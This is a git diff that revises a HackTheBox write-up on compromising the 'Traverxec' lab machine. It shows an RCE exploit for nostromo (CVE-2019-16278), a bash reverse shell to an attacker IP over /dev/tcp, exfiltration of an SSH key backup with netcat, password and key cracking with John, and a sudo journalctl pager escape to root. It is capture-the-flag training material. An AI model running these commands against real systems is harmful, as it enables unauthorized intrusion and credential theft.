@@ -44,21 +44,20 @@ searchsploit nostrormo
 
 ## Initial access:
 
-After checking the results of serachsploit I observed that only 2 are showing the relevant version & from these 2 only 1 is having python exploit as other one is showing the metasploit exploit.
-To not use the metasploit, I downloaded the python exploit & made some changes in the scirpt as it was showing error while running.
+After checking the results of searchsploit, I noticed that only 2 exploits are related to the relevant version, and out of these 2, only 1 is a Python exploit. The other one is a Metasploit exploit, which I prefer not to use. To proceed without Metasploit, I downloaded the Python exploit and made some modifications to the script as it was showing errors while running.
 
-After making the necessary changes, I executed the script & observed the results:
+After making the necessary changes, I executed the script to exploit the CVE-2019-16278 vulnerability on the target machine:
 
-```bash
+```python
 python cve-2019-16278.py 10.10.10.165 80 'cat /etc/passwd'
 ```
+The script successfully executed, and I obtained the output shown in the screenshot:
+
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a24e9815-044f-402b-b87b-7e3d7e90c107)
 
-In the /etc/passwd file I observed 1 user "david".
+While exploring the contents of the **/etc/passwd** file, I discovered a user named "david." To gain a reverse shell on the target machine, I used a convenient bash one-liner and executed it through the python script. Within moments, I received a reverse shell in my netcat listener, confirming successful access to the system. 🙂
 
-Moving further to get a reverse shell, I used bash one-liner & executed it using the python script. After the execution I quickly received the reverse shell in my netcat listener. 🙂
-
-```bash
+```python
 python cve-2019-16278.py 10.10.10.165 80 'bash -c "bash -i >& /dev/tcp/10.10.14.128/53 0>&1"'
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3b02ff8a-35ab-4d78-b109-108963928749)
@@ -67,26 +66,25 @@ python cve-2019-16278.py 10.10.10.165 80 'bash -c "bash -i >& /dev/tcp/10.10.14.
 
 ## User access:
 
-Now, I got the initial access as user "www-data" but I still don't have the user flag or sufficient access to read david's file.
-To gain access as david, I started looking for manually & in one of the directory "/var/nostromo/conf" I found hashed credential belongs to david.
+After gaining initial access as the "www-data" user, my next objective was to escalate privileges and gain access to user "david." I began by manually searching the system and discovered hashed credentials for "david" in the "/var/nostromo/conf" directory.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e1ff9641-baee-4355-91e9-7b302ca5dfb2)
 
-I cracked this hash & gained the cleartext password from it:
+I successfully cracked the hash and obtained the cleartext password:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9393b618-85b9-4d42-ab73-9fe7db127132)
 
-Using this password I tried to switch to David from www-data & also tried to login via SSH but none of them worked. 😕
+My attempts to switch to "david" from the "www-data" user and to log in via SSH using the cracked password were unsuccessful.😕
 
-I then searched about the nhttpd documentation & found [this](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd):
+However, while exploring the nhttpd [documentation](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd), I came across valuable information:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/72ae33a3-9e70-4aad-8ce7-9b29691d7f78)
 
-Using the above logic, when I checked for the "~david", I observed that he is having his home dircetory hosted on the web:
+Following this logic, I checked for the "~david" path and found that "david" has his home directory hosted on the web::
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/59e62377-8aa1-4308-b5a0-9a6a76c09af9)
 
-Now, when I checked the existing "nhttpd.conf" file I observed the "homedirs_public" folder at "public_www":
+Subsequently, I explored the "nhttpd.conf" file and discovered the "homedirs_public" folder at "public_www":
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e0f70c5c-d579-4147-b234-05aa203a6b15)
 
@@ -94,11 +92,11 @@ So, I moved into the David home directory & tried to list out the files but the 
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0da7de0d-8a8a-4389-b96f-43bd99076013)
 
-While checking the directory, I observed a folder "cd protected-file-area" & in that folder I observed a backup file: "backup-ssh-identity-files.tgz".
+Within "David's" home directory, I encountered a folder named "protected-file-area" that contained a backup file named "backup-ssh-identity-files.tgz":
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4c5e4650-68d0-4b12-b99c-dfe7ddafa84b)
 
-I transferred this backup file to my kali host using netcat:
+I transferred this backup file to my Kali host using netcat:
 
 ```bash
 #from the victim machine
@@ -110,18 +108,18 @@ nc -lnvp <port> > output-file.tgz
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c1d9a98f-87d4-464a-82f9-161c2f05a53d)
 
-Once the transfer is completed I unzipped the file using 'tar' comaand:
+Once the transfer was complete, I extracted the contents of the "backup-ssh.tgz" file using the following command:
 
 ```bash
 tar xzvf backup-ssh.tgz
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5d34a73a-506f-4158-aba7-65484c993de6)
 
-After unzipping the file I got the "david" home directory which contains ssh private keys.
+Among the extracted files, I found the "id_rsa" SSH private key. 
 
-I changed the SSH private key file permission using "chmod 600" & tried to login with this key. But observed that this key is encrypted & I need password to use this private key as well.
+I changed the SSH private key file permission using "chmod 600" & tried to login with this key. However, the key was encrypted and required a password for use.
 
-So, I used John The ripper to crack the SSH private key password, using below command:
+To proceed, I used John The Ripper to crack the SSH private key password:
 
 ```bash
 ssh2john id_rsa > john_rsa
@@ -129,11 +127,11 @@ ssh2john id_rsa > john_rsa
 john john_rsa -w=/usr/share/wordlist/rockyou.txt
 ```
 
-After conevrting the file into John the ripper format & using the same to crack, I got the clear-text credentials in just few seconds:
+Using this method, I quickly obtained the clear-text credentials:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4ba889f3-e112-447d-9a71-0b8164880ee8)
 
-After using the cracked credentilas, I was finally able to login to David & fetched the user flag as well. (pwn3d!🙂)
+With the cracked credentials, I successfully logged in as "david" and retrieved the user flag. Mission accomplished! (pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/280cfb58-a11b-4191-aeca-6c1f3d056cad)
 
@@ -141,7 +139,7 @@ After using the cracked credentilas, I was finally able to login to David & fetc
 
 ## Privilege Escalation:
 
-After gaining the access of David I started looking at the other files in David's home directory & I observed a file in the /bin folder "server-stats.sh"
+After gaining access to user "david," I explored the contents of David's home directory and found an interesting file named "server-stats.sh" in the "/bin" folder:
 
 File contains below code:
 
@@ -157,7 +155,7 @@ echo " "
 echo "Last 5 journal log lines:"
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
 ```
-In the last of the code we can see that it's running "journalctl" command with sudo privileges. I checked the GtfoBins for "journalctl" & obsred that it invokes the default pager, which is likely to be less, other functions may apply.
+The script runs the "journalctl" command with sudo privileges in the last line of the script, which piqued my interest. After reviewing the GtfoBins page for "journalctl," I discovered that it invokes the default pager, often "less," which provides an opportunity for privilege escalation.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/82e18d27-9f92-4b39-9061-eebf8a005267)
 
@@ -167,13 +165,13 @@ While running the last line of code manually, it isn't loading the less pager.
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 ```
 
-I tried multiple time to load less pager in different way but everytime the service is getting started without opening the less pager, then in the end I thought to just minimze my terminal winodw size so, that the command won't be able to get sufficient 5 lines to display the results.
+Upon executing the last line of the script manually, the less pager didn't load as expected. However, I found a clever solution: by minimizing the terminal window's size, the journalctl command would be unable to display the required 5 lines, triggering the loading of the less pager.
 
-And, this actually worked as this loaded the less pager in the terminal:
+Executing the following command with a minimized terminal loaded the less pager:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9bad58f8-959c-4da0-92c5-ec0930d0af18)
 
-Once this less pager is loaded I just executed the "!/bin/bash" to load the bash shell. Which then loaded the shell as a root user. (pwn3d!🙂)
+Once the less pager was loaded, I used the command "!/bin/bash" to execute a bash shell, effectively gaining root access. (pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f553be3b-5da0-439f-9bf8-9595058a95ad)
 
